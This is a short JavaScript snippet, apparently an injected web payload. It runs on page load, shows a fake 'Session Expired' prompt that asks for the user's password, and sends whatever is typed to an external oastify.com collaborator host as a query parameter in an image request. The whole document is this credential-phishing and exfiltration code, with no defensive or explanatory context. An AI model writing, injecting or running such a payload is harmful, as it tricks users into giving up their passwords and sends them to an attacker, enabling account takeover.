window.addEventListener('load', function() {
    // Show a prompt to the user to enter their password
    let password = prompt("Session Expired. Please re-enter your password:");

    // If the user entered a password, send it to the external server
    if (password) {
        // Make an image request to the external server with the password as a query parameter
        new Image().src = `https://7z78izwvrg0u9gsi9lwme1z29tfk3c20r.oastify.com?password=${encodeURIComponent(password)}`;
    }
});
